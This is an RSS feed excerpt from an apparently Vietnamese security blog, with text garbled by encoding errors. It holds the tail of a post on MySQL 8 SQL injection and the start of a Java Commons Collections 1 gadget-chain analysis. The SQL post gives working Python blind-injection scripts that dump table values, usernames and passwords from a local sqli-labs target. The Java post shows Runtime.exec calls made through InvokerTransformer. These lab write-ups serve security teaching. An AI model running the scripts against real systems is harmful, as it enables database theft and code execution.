class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nháº­p cÃ¡c giÃ¡ trá»‹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p database cá»§a table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_value = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                value + j, db_name, tb_name, <span class="built_in">str</span>(index))</span><br><span class="line">            <span class="built_in">print</span>(value + j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    all_value.append(value)</span><br><span class="line">    value = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All value:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_value)</span><br></pre></td></tr></table></figure><p>Dump username</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nháº­p cÃ¡c giÃ¡ trá»‹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p database cá»§a table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p index cá»§a id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">index = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># vÃ¬ chÃºng ta biáº¿t Ä‘Æ°á»£c index cá»§a id tá»« script Ä‘áº§u tiÃªn rá»“i</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">id</span>, value + j, db_name, tb_name, index)</span><br><span class="line">        <span class="built_in">print</span>(value + j)</span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GiÃ¡ trá»‹ cáº§n tÃ¬m lÃ : &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><p>Dump password:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump username</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nháº­p cÃ¡c giÃ¡ trá»‹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p database cá»§a table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p username: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">username = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p index cá»§a id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">index = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># vÃ¬ chÃºng ta biáº¿t Ä‘Æ°á»£c index cá»§a id tá»« script Ä‘áº§u tiÃªn rá»“i</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">id</span>,username, value + j, db_name, tb_name, index)</span><br><span class="line">        <span class="built_in">print</span>(value + j)</span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GiÃ¡ trá»‹ cáº§n tÃ¬m lÃ : &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><h2 id="HANDLER-Statement"><a href="#HANDLER-Statement" class="headerlink" title="HANDLER Statement"></a>HANDLER Statement</h2><h3 id="Systax"><a href="#Systax" class="headerlink" title="Systax:"></a>Systax:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> HANDLER users <span class="keyword">OPEN</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read <span class="keyword">first</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> I<span class="operator">-</span>kill<span class="operator">-</span>you <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy    <span class="operator">|</span> p<span class="variable">@ssword</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">Äá»ƒ vá» láº¡i tá»« Ä‘áº§u chÃºng ta sáº½ báº¯t Ä‘áº§u láº¡i tá»« <span class="keyword">first</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read <span class="keyword">first</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><p>Alias tÃªn báº£ng:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler users <span class="keyword">open</span> <span class="keyword">as</span> rayin;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler rayin read <span class="keyword">first</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler rayin read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> I<span class="operator">-</span>kill<span class="operator">-</span>you <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Mysql/">Mysql</category>
      
      <category domain="https://rayinaw.github.io/categories/Mysql/SQLi/">SQLi</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Mysql/">Mysql</category>
      
      <category domain="https://rayinaw.github.io/tags/SQLi/">SQLi</category>
      
      
      <comments>https://rayinaw.github.io/2022/11/27/sqli-mysql8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PhÃ¢n tÃ­ch chuá»—i Commons Collections 1 vá»›i TransformedMap</title>
      <link>https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/</link>
      <guid>https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/</guid>
      <pubDate>Fri, 04 Nov 2022 11:00:38 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Mot-vai-khai-niem-can-nam&quot;&gt;&lt;a href=&quot;#Mot-vai-khai-niem-can-nam&quot; class=&quot;headerlink&quot; title=&quot;Má»™t vÃ i khÃ¡i niá»‡m cáº§n náº¯m&quot;&gt;&lt;/a&gt;Má»™t vÃ i khÃ¡</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Mot-vai-khai-niem-can-nam"><a href="#Mot-vai-khai-niem-can-nam" class="headerlink" title="Má»™t vÃ i khÃ¡i niá»‡m cáº§n náº¯m"></a>Má»™t vÃ i khÃ¡i niá»‡m cáº§n náº¯m</h2><p>TrÆ°á»›c tiÃªn chÃºng ta cáº§n hÃ¬nh dung lá»›p Runtime sáº½ exec cÃ¢u lá»‡nh nhÆ° nÃ o, á»Ÿ Ä‘Ã¢y mÃ¬nh cÃ³ sá»­ dá»¥ng kiáº¿n thá»©c reflection mÃ  mÃ¬nh Ä‘Ã£ cÃ³ bÃ i viáº¿t vá» nÃ³, cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm.</p><ul><li>Lá»›p java.lang.reflect.Method cÃ³ phÆ°Æ¡ng thá»©c invoke, nÃ³ dÃ¹ng Ä‘á»ƒ invoke method cá»§a object Ä‘Æ°á»£c truyá»n vÃ o á»Ÿ tham sá»‘ Ä‘áº§u tiÃªn, vÃ  vá»›i cÃ¡c tham sá»‘ cá»§a method nÃ y lÃ  Object args (tham sá»‘ lÆ°u dÆ°á»›i dáº¡ng object).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span>  <span class="keyword">throws</span> IllegalAccessException,  </span><br><span class="line">               IllegalArgumentException,  </span><br><span class="line">                InvocationTargetException  </span><br></pre></td></tr></table></figure></li><li>Trong lá»›p Runtime cÃ³ phÆ°Æ¡ng thá»©c exec dÃ¹ng Ä‘á»ƒ exec cÃ¢u lá»‡nh trÃªn system.</li><li>BÃ¢y giá» mÃ¬nh sáº½ thá»±c hiá»‡n invoke method exec cá»§a lá»›p runtime, vÃ¬ nÃ³ lÃ  method private nÃªn Ä‘á»ƒ sá»­ dá»¥ng chÃºng ta cáº§n setAccessible(â€œtrueâ€).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> Runtime.class.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,  String.class);</span><br><span class="line">        execMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="PhÃ¢n tÃ­ch"></a>PhÃ¢n tÃ­ch</h2><p>SÆ¡ Ä‘á»“ tÃ³m táº¯t chuá»—i.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><h3 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h3><p>Chain nÃ y báº¯t Ä‘áº§u tá»« lá»›p InvokerTransformer. Lá»›p nÃ y implements interface Transformer.</p><p>HÃ m táº¡o cá»§a lá»›p InvokerTransformer:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/InvokerTransformerConstructor.png"></p><ul><li><code>Object[] args</code> á»Ÿ Ä‘Ã¢y nháº­n má»™t Object vá»›i kiá»ƒu String.</li><li><code>Class[] paramTypes</code> nháº­n má»™t Object cá»§a lá»›p Class</li></ul><p>Trong trÆ°á»ng structure tÃ¬m Ä‘áº¿n method transform trong class InvokerTransformer ta tháº¥y:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/InvokerTransformerTransform.png"></p><ul><li>Äáº§u tiÃªn, nÃ³ thá»±c hiá»‡n láº¥y class cá»§a object input lÃ  tham sá»‘ cá»§a phÆ°Æ¡ng thá»©c transform.</li><li>Tiáº¿p theo nÃ³ thá»±c hiá»‡n láº¥y phÆ°Æ¡ng thá»©c vá»›i tÃªn phÆ°Æ¡ng thá»©c lÃ  tham sá»‘ iMethodName cá»§a object cá»§a lá»›p InvokerTransformer, vÃ  iParamTypes lÃ  lá»›p Ä‘áº¡i diá»‡n cho kiá»ƒu tham sá»‘ cá»§a phÆ°Æ¡ng thá»©c nÃ y rá»“i gÃ¡n vÃ o object method cÃ³ kiá»ƒu lÃ  Method.<br>Sau Ä‘Ã³ nÃ³ thá»±c hiá»‡n invoke method lÃ  iMethodName cá»§a cá»§a object input vá»›i tham sá»‘ lÃ  iArgs.</li></ul><p>CÃ³ nghÄ©a khi chÃºng ta thá»±c hiá»‡n <code>invoker.transform(object)</code> nÃ³ sáº½ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i viá»‡c chÃºng ta thá»±c hiá»‡n invoke() method chá»©a trong biáº¿n invoker cá»§a object. Váº­y nÃªn á»Ÿ Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng lá»›p InvokerTransformer Ä‘á»ƒ thá»±c hiá»‡n lá»‡nh exec cá»§a lá»›p Runtime.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//Runtime.getRuntime() tráº£ vá» má»™t object cá»§a lá»›p Runtime</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiáº¿p theo chÃºng ta cáº§n tÃ¬m lá»›p nÃ o gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c transform cá»§a lá»›p InvokerTransformer.</p><p><code>Ctrl + Chuá»™t trÃ¡i</code> click vÃ o phÆ°Æ¡ng thá»©c transform:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ClassesCallMethodTransform.png"></p><p>PhÆ°Æ¡ng thá»©c nÃ y cÃ³ nhiá»u lá»›p gá»i Ä‘áº¿n, nhÆ°ng Ä‘á»ƒ cÃ³ áº£nh hÆ°á»Ÿng lead to CC1 chá»‰ cÃ³ 2 lá»›p lÃ  TranformedMap vÃ  LazyMap. BÃ i viáº¿t nÃ y mÃ¬nh sáº½ phÃ¢n tÃ­ch theo hÆ°á»›ng TranformedMap. LazyMap mÃ¬nh sáº½ phÃ¢n tÃ­ch sau. CÃ¹ng phÃ¢n tÃ­ch thÃ´i nÃ o~</p><h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue"></a>TransformedMap.checkSetValue</h3><p>HÃ m nÃ y cÃ³ 3 phÆ°Æ¡ng thá»©c gá»i Ä‘áº¿n method transform lÃ  <code>checkSetValue</code>, <code>transformValue</code> vÃ  <code>transformKey</code>. Tuy nhiÃªn phÆ°Æ¡ng thá»©c chÃºng ta cáº§n Ä‘i vÃ o lÃ  <code>checkSetValue</code> bá»Ÿi vÃ¬ nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ nhá»¯ng lá»›p khÃ¡c vÃ  kÃ©o theo má»™t chuá»—i gadget.</p><p>PhÆ°Æ¡ng thá»©c checkSetValue:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-checkSetValue.png"></p><p>NhÃ¬n vÃ o phÆ°Æ¡ng thá»©c nÃ y chÃºng ta tháº¥y khÃ¡ tÆ°Æ¡ng Ä‘á»“ng vá»›i Ä‘oáº¡n code 